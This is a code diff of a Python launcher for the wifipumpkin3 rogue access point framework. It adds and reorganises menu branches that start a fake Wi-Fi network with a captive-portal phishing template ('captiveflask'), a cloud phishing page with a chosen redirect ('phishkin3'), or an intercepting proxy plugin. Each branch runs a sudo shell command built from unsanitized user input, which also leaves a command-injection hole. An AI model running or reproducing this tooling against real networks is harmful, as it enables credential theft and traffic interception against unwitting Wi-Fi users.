@@ -71,21 +71,29 @@ def Main():
         if proxies in proxy_commands:
             proxy_data = proxy_commands[proxies]
             print_color(f"\n{proxy_data['message']}", Color.OKGREEN + Color.BOLD)
-            if proxies == 'phishkin3':
+            if proxies == 'captiveflask':
+                print_color("Options:", Color.OKBLUE + Color.BOLD)
+                for option in proxy_data['options']:
+                    print_color(f" - {option}", Color.OKGREEN + Color.BOLD)
+                template = input("Which template do you want to use > ")
+                command = f'sudo wifipumpkin3 --xpulp "set interface {interface}; set ssid {ssid}; set proxy {proxies}; set {proxy_data["prefix"]}{template} true; start"'
+                print_color("\nLaunching program\n", Color.OKBLUE + Color.BOLD)
+                system(command)
+            elif proxies == 'phishkin3':
                 phishing_url = input("Enter the phishing URL > ")
                 redirect_url = input("Enter the redirect URL after login > ")
                 print_color("\nLaunching program\n", Color.OKBLUE + Color.BOLD)
                 system(f'sudo wifipumpkin3 --xpulp "set interface {interface}; set ssid {ssid}; set proxy {proxies}; set {proxy_data["prefix"]}cloud_url_phishing {phishing_url}; set {proxy_data["prefix"]}redirect_url_after_login {redirect_url}; start"')
-            else:
+            elif proxies == 'pumpkinproxy':
                 print_color("Options:", Color.OKBLUE + Color.BOLD)
                 for option in proxy_data['options']:
                     print_color(f" - {option}", Color.OKGREEN + Color.BOLD)
                 plugin = input(f"What {proxies} plugin do you want to use > ")
                 print_color("\nLaunching program\n", Color.OKBLUE + Color.BOLD)
                 system(f'sudo wifipumpkin3 --xpulp "set interface {interface}; set ssid {ssid}; set proxy {proxies}; set {proxy_data["prefix"]}{plugin}; start"')
-        else:
-            print_color("\nLaunching program\n", Color.OKBLUE + Color.BOLD)
-            system(f'sudo wifipumpkin3 --xpulp "set interface {interface}; set ssid {ssid}; set proxy {proxies}; start"')
+            else:
+                print_color("\nLaunching program\n", Color.OKBLUE + Color.BOLD)
+                system(f'sudo wifipumpkin3 --xpulp "set interface {interface}; set ssid {ssid}; set proxy {proxies}; start"')
 
     except KeyboardInterrupt:
         print_color("\nClosing script", Color.FAIL + Color.BOLD)
